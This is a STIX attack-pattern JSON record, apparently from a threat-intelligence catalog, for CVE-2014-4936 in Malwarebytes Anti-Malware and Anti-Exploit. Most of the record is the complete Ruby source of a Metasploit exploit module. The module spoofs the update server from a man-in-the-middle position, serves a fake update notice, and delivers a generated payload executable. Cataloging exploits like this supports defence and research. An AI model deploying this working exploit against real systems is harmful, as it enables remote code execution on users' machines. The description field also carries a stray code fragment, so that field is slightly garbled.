{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f53f5c35-c8de-42e3-8962-62d3f933542b",
    "created": "2024-08-14T16:40:13.384284Z",
    "modified": "2024-08-14T16:40:13.384288Z",
    "name": "Malwarebytes Anti-Malware and Anti-Exploit Update Remote Code Execution",
    "description": " This module exploits a vulnerability in the update functionality of Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes Anti-Exploit consumer 1.03.1.1220. Due to the lack of proper update package validation, a man-in-the-middle (MITM) attacker could execute arbitrary code by spoofing the update server data-cdn.mbamupdates.com and uploading an executable. This module has been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/malwarebytes_update_exec.rb",
            "external_id": "malwarebytes_update_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4936"
        },
        {
            "source_name": "reference",
            "url": "http://blog.0x3a.com/post/104954032239/cve-2014-4936-malwarebytes-anti-malware-and#Discoverersblog"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking # Would be Great except MBAE doesn't version check\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n\n  VERSION_REGEX = /\\/v2\\/(mbam|mbae)\\/consumer\\/version.chk/\n  EXE_REGEX     = /\\/v2\\/(mbam|mbae)\\/consumer\\/data\\/(mbam|mbae)-setup-(.*)\\.exe/\n  NEXT_VERSION  = { mbam: '2.0.3.1025', mbae: '1.04.1.1012' }\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Malwarebytes Anti-Malware and Anti-Exploit Update Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a vulnerability in the update functionality of\n        Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes\n        Anti-Exploit consumer 1.03.1.1220.\n        Due to the lack of proper update package validation, a man-in-the-middle\n        (MITM) attacker could execute arbitrary code by spoofing the update server\n        data-cdn.mbamupdates.com and uploading an executable. This module has\n        been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Yonathan Klijnsma',  # Vulnerability discovery and PoC\n          'Gabor Seljan',       # Metasploit module\n          'todb'                # Module refactoring\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-4936' ],\n          [ 'OSVDB', '116050' ],\n          [ 'URL', 'http://blog.0x3a.com/post/104954032239/cve-2014-4936-malwarebytes-anti-malware-and'] # Discoverer's blog\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-12-16',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use (do not change)\", \"/\" ])\n      ])\n\n    # Vulnerable Malwarebytes clients do not allow altering these.\n    deregister_options('SSL', 'SSLVersion', 'SSLCert')\n  end\n\n  def on_request_uri(cli, request)\n    case request.uri\n    when VERSION_REGEX\n      serve_update_notice(cli) if set_exploit_target($1, request)\n    when EXE_REGEX\n      serve_exploit(cli)\n    else\n      vprint_status \"Sending empty page for #{request.uri}\"\n      serve_default_response(cli)\n    end\n  end\n\n  def serve_default_response(cli)\n    send_response(cli, '')\n  end\n\n  def check_client_version(request)\n    return false unless request['User-Agent'] =~ /base:(\\d+\\.\\d+\\.\\d+\\.\\d+)/\n    this_version = $1\n    next_version = NEXT_VERSION[:mbam]\n    if\n      Rex::Version.new(next_version) >= Rex::Version.new(this_version)\n      return true\n    else\n      print_error \"Version #{this_version} of Anti-Malware isn't vulnerable, not attempting update.\"\n      return false\n    end\n  end\n\n  def set_exploit_target(package, request)\n    case package\n    when /mbam/i\n      if check_client_version(request)\n        @client_software = ['Anti-Malware', NEXT_VERSION[:mbam]]\n      else\n        serve_default_response(cli)\n        return false\n      end\n    when /mbae/i\n      # We don't get identifying info from MBAE\n      @client_software = ['Anti-Exploit', NEXT_VERSION[:mbae]]\n    end\n  end\n\n  def serve_update_notice(cli)\n    software,next_version = @client_software\n    print_status \"Updating #{software} to (fake) #{next_version}. The user may need to click 'OK'.\"\n    send_response(cli, next_version,\n                  'Content-Type' => 'application/octet-stream'\n                 )\n  end\n\n  def serve_exploit(cli)\n    print_status \"Sending payload EXE...\"\n    send_response(cli, generate_payload_exe,\n                  'Content-Type' => 'application/x-msdos-program'\n                 )\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-16",
    "x_mitre_platforms": [
        "win'"
    ]
}